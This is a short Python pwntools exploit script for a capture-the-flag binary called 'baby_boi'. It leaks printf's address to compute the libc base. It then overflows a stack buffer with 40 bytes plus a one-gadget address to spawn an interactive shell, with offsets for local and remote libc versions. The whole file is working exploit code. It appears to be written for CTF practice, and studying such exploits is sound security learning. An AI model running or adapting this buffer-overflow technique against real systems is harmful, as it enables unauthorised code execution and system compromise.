from pwn import *
elf = ELF("./baby_boi")

local = True
if local:
	p = elf.process()
	# ldd ./baby_boi
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
	
else:
	pass
	# p = remote(host, port)
	# libc = ELF("./libc-2.27.so")

p.recvuntil("Here I am: ")
printf = int(p.recv().strip(), 16)
print(hex(printf))

# elf.address of every elf is 0 at first. 

libc.address = printf - libc.symbols["printf"]
print hex(libc.address)

if local:
	# oneshot = libc.address + 0xe6c7e
	oneshot = libc.address + 0xe6c81
	# oneshot = libc.address + 0xe6c84
else:
	# oneshot = libc.address + 0x4f2c5
	oneshot = libc.address + 0x4f322
	# oneshot = libc.address + 0x10a38c

payload = 'A' * 40 + p64(oneshot)

p.sendline(payload)
p.interactive()